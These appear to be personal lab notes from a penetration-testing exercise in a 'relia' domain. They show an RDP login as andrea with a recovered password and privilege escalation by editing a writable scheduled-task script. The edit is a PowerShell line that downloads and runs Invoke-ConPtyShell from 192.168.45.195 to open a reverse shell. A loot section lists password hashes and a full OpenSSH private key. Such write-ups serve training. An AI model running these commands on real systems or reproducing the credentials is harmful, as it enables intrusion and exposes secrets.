- Since we get `relia\andrea`'s password from `7` and he is within group `WKRDP`. We can `rdp` into the host  which can be confirmed by running `netexec`. ![[Pasted image 20240223104215.png]]
- Run `xfreerdp /v:172.16.110.15 /d:relia /u:andrea /p:PasswordPassword_6 /drive:resources,/home/saxon/Desktop /dynamic-resolution` to get a `rdp` session as `relia\andrea`.
# PrivEsc
- `winpeas` will identify we have `WriteData/CreateFiles` on file `C:\schedule.ps1`. 
	- Upon further inspection, it involves in an action of  moving an executable belong to `milana` to another folder, indicating it is probably running periodically and with the privilege of `milana` or higher.
	- Running `schtasks /query /v /fo list > task.txt` and search for `scheduler.ps1` can further confirm the assumption.![[Pasted image 20240223113652.png]]
- Edit the file by add the line `powershell.exe -nop -w hidden -c iex(iwr http://192.168.45.195/Windows/nishang/Shells/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.195 443` to receive a reverse shell as `relia\muilana`.
	- which also happens to be one of the local administrator.![[Pasted image 20240223113117.png]]
# Loot
- offsec: cf998001c44803b490a46f363a2ca812
- `relia\milana`: 2237ff5905ec2fd9ebbdfa3a14d1b2b6
- `sarah`: 
```id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAwAAAJgtoEZgLaBG
YAAAAAtzc2gtZWQyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAw
AAAECk3NMSFKJMauIwp/DPYEhMV4980aMdDOlfIlTq3qy4SkSFGA7D4B3Cvr5H8Dng2Dvl
YrVWwfV/7GWhjAhsWegDAAAADnRlc3RzQGhhdC13b3JrAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```